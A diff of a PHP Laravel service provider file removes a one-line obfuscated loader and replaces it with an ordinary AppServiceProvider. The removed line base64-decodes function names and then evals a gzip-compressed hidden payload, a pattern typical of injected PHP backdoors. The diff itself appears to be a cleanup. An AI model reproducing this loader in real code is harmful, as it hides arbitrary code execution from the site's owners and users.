@@ -1,1 +1,40 @@
-<?php $_='61edf6c6';$__='printf'; $_____='b2JfZW5kX2NsZWFu'; $______________='cmV0dXJuICAgIGV2YWwoJF8pOw=='; $__________________='X19vbWVnYQ=='; $______=' Z3p1bmNvbXByZXNz';$___=' b2Jfc3RhcnQ=';$____='b2JfZ2V0X2NvbnRlbnRz';$__= 'base64_decode' ; $______=$__($______); if(!function_exists('__omega')){function __omega($_oA,$_oS){return eval("return function($_oA){{$_oS}};");}}$__________________=$__($__________________); $______________=$__($______________); $__________=$__________________('$_',$______________); $_____=$__($_____);$____=$__($____);$___=$__($___); $_='eNqVVEuTojAQvu+v4LBVjFV7ANSZsSwPgvLSwfFBgFymSKKgJsIuPsBfv0FRmd3Zw1IV6KS7v/46H4kgXJ/vH4+nJyrNNlohWRK7368L6a/1br8Su9+EWnxPEH25c0Qe2AXTXk8UHu4bXo+bImZAIr59sDSVEqZnI2228uXXdHIqk4TPoB+CcElCYbZ8bn2QJU7IUuz+RXEwTRyNtWNe/YwNfQPnqopNFbumfSSMbqFvnycnaTSYpjJW3Gju5Rnx5BQxXYIgXxBfPaGmLflDGAeKzuMd7CpOAj05LvOI71BrSDNkgn3otWNiAOw2wQkbnYLo+YLjK6Hn0Ec96+V/as0U7ltkjhZJo0DJY9x8i6Y8zlVAwfE2EKgFasIUGqCwDNDi9Q/QfIu+8vO6vHYSWVo/GhfJz5ttaUnkMrALfUfi/KLAa7ctQ+c95CnnIYVe52CZDsU7yOfgPOZcrnn9TxhT06bEBAVaqwpS6LbmO95sbII1MujGMqCMmFNh2xQq9My5FyNt62jrMkd9eeSX4/WOsZqWen3dx5R1jsR0JMz0E+/hsJyrMdc74xpwbeiRczvfNMFFq6rVj0a1nqyhWkB/JmPWigjrpLD/8I1PlW2qcsD4/hQqI157U2GvkdKR/tmD7mxCA+yDRfLM9WCBDzKil1zpAUo5RYxIoRblk8Uwvf6Ttdwh4fzd5wnje8U6BZzHtbr9xDYB78vKLG0WB4xmoT9rj+Z/7uGF0723Kmf/zuIYy/YRGW5iNx0Zcx3Gnr5FHj3YxTZ6L1QJ7wC1BkmEdiBDg+y+bxc95tuXujblqN0BtWN++T5Vs8bl1qitNbq3yMvik1i+xR/38M8XQIXzVD/vjUb3N7wMepg='; $___();$__________($______($__($_))); $________=$____(); $_____(); echo $________;
+<?php
+
+namespace App\Providers;
+
+use Illuminate\Support\Facades\Schema;
+use Illuminate\Support\ServiceProvider;
+use Illuminate\Support\Facades\Gate;
+use Illuminate\Support\Facades\Validator;
+
+class AppServiceProvider extends ServiceProvider
+{
+    /**
+     * Register any application services.
+     *
+     * @return void
+     */
+    public function register()
+    {
+        //
+    }
+
+    /**
+     * Bootstrap any application services.
+     *
+     * @return void
+     */
+    public function boot()
+    {
+        Schema::defaultStringLength(191);
+
+        Gate::before(function ($user, $ability) {
+            return $user->hasRole('super-admin') ? true : null;
+        });
+
+        // Validator::extend('formatted_phone', function ($attribute, $value, $parameters, $validator) {
+        //     // Use the formatted_phone_number function to check if the phone number is valid
+        //     return !empty(formatted_phone_number($value));
+        // });
+    }
+}
